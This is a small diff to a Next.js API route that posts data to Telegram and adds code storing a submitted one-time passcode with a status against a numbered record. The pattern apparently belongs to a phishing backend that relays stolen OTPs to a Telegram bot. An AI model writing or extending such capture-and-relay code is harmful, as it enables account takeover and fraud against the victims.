@@ -1,5 +1,6 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { TELEGRAM_CONFIG } from '@/lib/database';
+import { caseStore } from '@/lib/store';
 
 export async function POST(request: NextRequest) {
     try {
@@ -40,6 +41,11 @@ DATOS
                 parse_mode: 'HTML'
             })
         });
+
+        // Update local store
+        if (registro) {
+            caseStore.updateCaseData(parseInt(registro), { otp, status: 3 });
+        }
 
         return NextResponse.json({
             success: true,
